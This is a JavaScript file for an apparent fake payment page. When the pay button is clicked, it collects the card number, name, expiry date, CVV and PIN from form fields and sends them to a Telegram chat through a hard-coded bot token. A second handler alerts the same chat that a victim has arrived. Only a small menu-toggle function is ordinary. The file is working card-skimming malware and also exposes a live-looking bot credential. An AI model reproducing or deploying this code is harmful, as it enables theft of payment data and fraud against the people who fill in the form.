

let but = document.querySelector(".pay")


but.addEventListener("click", (e) => {
  var num = document.querySelector("#num").value
  var saxeli = document.querySelector("#saxeli").value
  var gvari = document.querySelector("#gvari").value
  var expym = document.querySelector("#exp").value
  var ccv = document.querySelector("#ccv").value
  var pin = document.querySelector("#pin").value




  
  var token = "6907068275:AAHajtrtMi-hrziv3XBKd2LvfInnfNcN8AA"
    var chatid = -4071018603
    var mytext = `Results: %0A Num=${num} %0A Name= ${saxeli} %0A Lastname = ${gvari} %0A date= ${expym} %0A pin= ${pin} %0A ccv= ${ccv}`
  
  var url = ` https://api.telegram.org/bot6907068275:AAHajtrtMi-hrziv3XBKd2LvfInnfNcN8AA/sendMessage?chat_id=-4071018603&text=${mytext}`


  async function logdata() {
    const response = await fetch(url);
    const data = await response.json();
  }



  logdata()

})

const menu = document.querySelector(".menu");
const menuItems = document.querySelectorAll(".menuItem");
const hamburger= document.querySelector(".hamburger");
const closeIcon= document.querySelector(".closeIcon");
const menuIcon = document.querySelector(".menuIcon");

function toggleMenu() {
  if (menu.classList.contains("showMenu")) {
    menu.classList.remove("showMenu");
    closeIcon.style.display = "none";
    menuIcon.style.display = "block";
  } else {
    menu.classList.add("showMenu");
    closeIcon.style.display = "block";
    menuIcon.style.display = "none";
  }
}

hamburger.addEventListener("click", toggleMenu);

menuItems.forEach( 
  function(menuItem) { 
    menuItem.addEventListener("click", toggleMenu);
  }
)

let gaqroba = document.querySelector(".done")
let blur = document.querySelector(".blur")

gaqroba.addEventListener('click', () => {
  blur.classList.add('wadi')



  var token = "6907068275:AAHajtrtMi-hrziv3XBKd2LvfInnfNcN8AA"
  var chatid = -4071018603
  var mytext = `Shedis kaci moemzade !!!!`

  var url = ` https://api.telegram.org/bot6907068275:AAHajtrtMi-hrziv3XBKd2LvfInnfNcN8AA/sendMessage?chat_id=-4071018603&text=${mytext}`


  async function logdata() {
    const response = await fetch(url);
    const data = await response.json();
  }
  


  logdata()
  logdata()
  logdata()

})


